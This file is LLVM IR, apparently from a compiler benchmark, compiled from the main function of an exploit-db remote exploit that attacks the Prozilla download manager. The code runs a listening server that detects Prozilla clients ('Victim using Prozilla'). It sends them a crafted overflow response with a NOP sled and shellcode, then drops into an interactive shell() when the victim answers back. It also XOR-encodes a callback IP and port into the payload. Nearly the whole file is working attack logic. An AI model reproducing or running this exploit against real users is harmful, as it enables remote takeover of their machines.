; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_806.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_806.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }
%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [8 x i8] c"hc:p:t:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [16 x i8] c"Invalid port.\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"[+] Default Target [ %s 0x%.08x]\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.4 = private unnamed_addr constant [26 x i8] c"[+] Target [ %s 0x%.08x]\0A\00", align 1
@MAX_RESPONSE = common dso_local global i32 0, align 4
@TRUE = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [20 x i8] c"[+] Victim at : %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Prozilla\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c"[+] Victim using Prozilla.\0A\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"SSSS\00", align 1
@.str.9 = private unnamed_addr constant [26 x i8] c"Nice , Victim Responded!\0A\00", align 1
@.str.10 = private unnamed_addr constant [62 x i8] c"[+] Victim is not using Prozilla! Sending a normal response.\0A\00", align 1
@real_response = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [5 x i8] c"send\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"Done\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca [2048 x i8], align 16
  %23 = alloca [2048 x i8], align 16
  %24 = alloca %struct.sockaddr_in*, align 8
  %25 = alloca %struct.sockaddr_in*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 194, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 1, i32* %9, align 4
  %26 = call i64 @malloc(i32 4)
  %27 = inttoptr i64 %26 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %27, %struct.sockaddr_in** %24, align 8
  %28 = call i64 @malloc(i32 4)
  %29 = inttoptr i64 %28 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %29, %struct.sockaddr_in** %25, align 8
  br label %30

30:                                               ; preds = %102, %2
  %31 = load i32, i32* %4, align 4
  %32 = load i8**, i8*** %5, align 8
  %33 = call i32 @getopt(i32 %31, i8** %32, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  store i32 %33, i32* %13, align 4
  %34 = load i32, i32* @EOF, align 4
  %35 = icmp ne i32 %33, %34
  br i1 %35, label %36, label %103

36:                                               ; preds = %30
  %37 = load i32, i32* %13, align 4
  switch i32 %37, label %102 [
    i32 104, label %38
    i32 99, label %43
    i32 112, label %46
    i32 116, label %59
  ]

38:                                               ; preds = %36
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @usage(i8* %41)
  br label %43

43:                                               ; preds = %36, %38
  store i32 1, i32* %8, align 4
  %44 = load i32, i32* @optarg, align 4
  %45 = call i32 @sscanf(i32 %44, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32* %18, i32* %19, i32* %20, i32* %21)
  br label %102

46:                                               ; preds = %36
  store i32 1, i32* %7, align 4
  %47 = load i32, i32* @optarg, align 4
  %48 = call i32 @atoi(i32 %47)
  store i32 %48, i32* %10, align 4
  %49 = load i32, i32* %10, align 4
  %50 = icmp sle i32 %49, 0
  br i1 %50, label %54, label %51

51:                                               ; preds = %46
  %52 = load i32, i32* %10, align 4
  %53 = icmp sgt i32 %52, 65535
  br i1 %53, label %54, label %58

54:                                               ; preds = %51, %46
  %55 = load i32, i32* @stderr, align 4
  %56 = call i32 (i32, i8*, ...) @fprintf(i32 %55, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  %57 = call i32 @exit(i32 1) #3
  unreachable

58:                                               ; preds = %51
  br label %102

59:                                               ; preds = %36
  %60 = load i32, i32* @optarg, align 4
  %61 = call i32 @atoi(i32 %60)
  store i32 %61, i32* %9, align 4
  %62 = load i32, i32* %9, align 4
  %63 = icmp slt i32 %62, 1
  br i1 %63, label %67, label %64

64:                                               ; preds = %59
  %65 = load i32, i32* %9, align 4
  %66 = icmp sgt i32 %65, 6
  br i1 %66, label %67, label %84

67:                                               ; preds = %64, %59
  store i32 1, i32* %9, align 4
  %68 = load i32, i32* @stderr, align 4
  %69 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %70 = load i32, i32* %9, align 4
  %71 = sub nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i64 %72
  %74 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %77 = load i32, i32* %9, align 4
  %78 = sub nsw i32 %77, 1
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %76, i64 %79
  %81 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %80, i32 0, i32 1
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i8*, ...) @fprintf(i32 %68, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i8* %75, i32 %82)
  br label %101

84:                                               ; preds = %64
  %85 = load i32, i32* @stderr, align 4
  %86 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %87 = load i32, i32* %9, align 4
  %88 = sub nsw i32 %87, 1
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %86, i64 %89
  %91 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %90, i32 0, i32 0
  %92 = load i8*, i8** %91, align 8
  %93 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %94 = load i32, i32* %9, align 4
  %95 = sub nsw i32 %94, 1
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %93, i64 %96
  %98 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %97, i32 0, i32 1
  %99 = load i32, i32* %98, align 8
  %100 = call i32 (i32, i8*, ...) @fprintf(i32 %85, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %92, i32 %99)
  br label %101

101:                                              ; preds = %84, %67
  br label %102

102:                                              ; preds = %36, %101, %58, %43
  br label %30

103:                                              ; preds = %30
  %104 = load i32, i32* %7, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %112

106:                                              ; preds = %103
  %107 = load i32, i32* %10, align 4
  %108 = and i32 %107, 65280
  %109 = ashr i32 %108, 8
  store i32 %109, i32* %11, align 4
  %110 = load i32, i32* %10, align 4
  %111 = and i32 %110, 255
  store i32 %111, i32* %12, align 4
  br label %118

112:                                              ; preds = %103
  store i32 8080, i32* %10, align 4
  %113 = load i32, i32* %10, align 4
  %114 = and i32 %113, 65280
  %115 = ashr i32 %114, 8
  store i32 %115, i32* %11, align 4
  %116 = load i32, i32* %10, align 4
  %117 = and i32 %116, 255
  store i32 %117, i32* %12, align 4
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %8, align 4
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %126, label %121

121:                                              ; preds = %118
  %122 = load i8**, i8*** %5, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 0
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @usage(i8* %124)
  br label %126

126:                                              ; preds = %121, %118
  %127 = getelementptr inbounds [2048 x i8], [2048 x i8]* %22, i64 0, i64 0
  %128 = load i32, i32* @MAX_RESPONSE, align 4
  %129 = call i32 @memset(i8* %127, i32 0, i32 %128)
  %130 = load %struct.sockaddr_in*, %struct.sockaddr_in** %24, align 8
  %131 = load %struct.sockaddr_in*, %struct.sockaddr_in** %25, align 8
  %132 = call i32 @init_socket(%struct.sockaddr_in* %130, %struct.sockaddr_in* %131, i32* %17)
  store i32 %132, i32* %15, align 4
  %133 = load i32, i32* %18, align 4
  %134 = load i32, i32* %6, align 4
  %135 = call i32 @find_xor(i32 %133, i32 %134, i32 6)
  store i32 %135, i32* %6, align 4
  %136 = load i32, i32* %19, align 4
  %137 = load i32, i32* %6, align 4
  %138 = call i32 @find_xor(i32 %136, i32 %137, i32 6)
  store i32 %138, i32* %6, align 4
  %139 = load i32, i32* %20, align 4
  %140 = load i32, i32* %6, align 4
  %141 = call i32 @find_xor(i32 %139, i32 %140, i32 6)
  store i32 %141, i32* %6, align 4
  %142 = load i32, i32* %21, align 4
  %143 = load i32, i32* %6, align 4
  %144 = call i32 @find_xor(i32 %142, i32 %143, i32 6)
  store i32 %144, i32* %6, align 4
  store i32 207, i32* %6, align 4
  %145 = load i32, i32* %11, align 4
  %146 = load i32, i32* %6, align 4
  %147 = call i32 @find_xor(i32 %145, i32 %146, i32 5)
  store i32 %147, i32* %6, align 4
  %148 = load i32, i32* %12, align 4
  %149 = load i32, i32* %6, align 4
  %150 = call i32 @find_xor(i32 %148, i32 %149, i32 5)
  store i32 %150, i32* %6, align 4
  br label %151

151:                                              ; preds = %233, %126
  %152 = load i64, i64* @TRUE, align 8
  %153 = icmp ne i64 %152, 0
  br i1 %153, label %154, label %234

154:                                              ; preds = %151
  %155 = load i32, i32* %15, align 4
  %156 = load %struct.sockaddr_in*, %struct.sockaddr_in** %25, align 8
  %157 = bitcast %struct.sockaddr_in* %156 to %struct.sockaddr*
  %158 = call i32 @accept(i32 %155, %struct.sockaddr* %157, i32* %17)
  store i32 %158, i32* %16, align 4
  %159 = icmp eq i32 %158, -1
  br i1 %159, label %160, label %162

160:                                              ; preds = %154
  %161 = call i32 @exit(i32 1) #3
  unreachable

162:                                              ; preds = %154
  %163 = load i32, i32* @stderr, align 4
  %164 = load %struct.sockaddr_in*, %struct.sockaddr_in** %25, align 8
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %164, i32 0, i32 0
  %166 = load i32, i32* %165, align 4
  %167 = call i8* @inet_ntoa(i32 %166)
  %168 = call i32 (i32, i8*, ...) @fprintf(i32 %163, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i8* %167)
  %169 = load i32, i32* %16, align 4
  %170 = getelementptr inbounds [2048 x i8], [2048 x i8]* %23, i64 0, i64 0
  %171 = call i64 @read(i32 %169, i8* %170, i32 2048)
  %172 = icmp eq i64 %171, 0
  br i1 %172, label %173, label %175

173:                                              ; preds = %162
  %174 = call i32 @exit(i32 1) #3
  unreachable

175:                                              ; preds = %162
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %23, i64 0, i64 0
  %177 = call i64 @strstr(i8* %176, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %178 = icmp ne i64 %177, 0
  br i1 %178, label %179, label %182

179:                                              ; preds = %175
  %180 = load i32, i32* @stderr, align 4
  %181 = call i32 (i32, i8*, ...) @fprintf(i32 %180, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0))
  store i32 1, i32* %14, align 4
  br label %204

182:                                              ; preds = %175
  %183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %23, i64 0, i64 0
  %184 = call i64 @strstr(i8* %183, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  %185 = icmp ne i64 %184, 0
  br i1 %185, label %186, label %191

186:                                              ; preds = %182
  %187 = load i32, i32* @stderr, align 4
  %188 = call i32 (i32, i8*, ...) @fprintf(i32 %187, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0))
  %189 = load i32, i32* %16, align 4
  %190 = call i32 @shell(i32 %189)
  br label %203

191:                                              ; preds = %182
  %192 = load i32, i32* @stderr, align 4
  %193 = call i32 (i32, i8*, ...) @fprintf(i32 %192, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.10, i64 0, i64 0))
  %194 = load i32, i32* %16, align 4
  %195 = load i32, i32* @real_response, align 4
  %196 = load i32, i32* @shellcode, align 4
  %197 = call i32 @strlen(i32 %196)
  %198 = call i32 @send(i32 %194, i32 %195, i32 %197, i32 0)
  %199 = icmp eq i32 %198, -1
  br i1 %199, label %200, label %202

200:                                              ; preds = %191
  %201 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  br label %202

202:                                              ; preds = %200, %191
  br label %203

203:                                              ; preds = %202, %186
  br label %204

204:                                              ; preds = %203, %179
  %205 = load i32, i32* %14, align 4
  %206 = icmp eq i32 %205, 1
  br i1 %206, label %207, label %217

207:                                              ; preds = %204
  %208 = load i32, i32* %16, align 4
  %209 = load i32, i32* %9, align 4
  %210 = call i32 @send_start(i32 %208, i32 %209)
  %211 = load i32, i32* %16, align 4
  %212 = call i32 @send_nop(i32 %211)
  %213 = load i32, i32* %16, align 4
  %214 = call i32 @send_url(i32 %213)
  %215 = load i32, i32* %16, align 4
  %216 = call i32 @send_end(i32 %215)
  store i32 0, i32* %14, align 4
  br label %217

217:                                              ; preds = %207, %204
  %218 = load i32, i32* %16, align 4
  %219 = call i32 @close(i32 %218)
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %23, i64 0, i64 0
  %221 = call i32 @memset(i8* %220, i32 0, i32 2048)
  %222 = call i64 (...) @fork()
  %223 = icmp eq i64 %222, 0
  br i1 %223, label %224, label %230

224:                                              ; preds = %217
  %225 = load %struct.sockaddr_in*, %struct.sockaddr_in** %25, align 8
  %226 = call i32 @free(%struct.sockaddr_in* %225)
  %227 = load %struct.sockaddr_in*, %struct.sockaddr_in** %24, align 8
  %228 = call i32 @free(%struct.sockaddr_in* %227)
  %229 = call i32 @exit(i32 0) #3
  unreachable

230:                                              ; preds = %217
  %231 = load i32, i32* %16, align 4
  %232 = call i32 @close(i32 %231)
  br label %233

233:                                              ; preds = %230
  br label %151

234:                                              ; preds = %151
  %235 = call i32 @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  ret i32 0
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @sscanf(i32, i8*, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @init_socket(%struct.sockaddr_in*, %struct.sockaddr_in*, i32*) #1

declare dso_local i32 @find_xor(i32, i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @shell(i32) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @send_start(i32, i32) #1

declare dso_local i32 @send_nop(i32) #1

declare dso_local i32 @send_url(i32) #1

declare dso_local i32 @send_end(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @free(%struct.sockaddr_in*) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
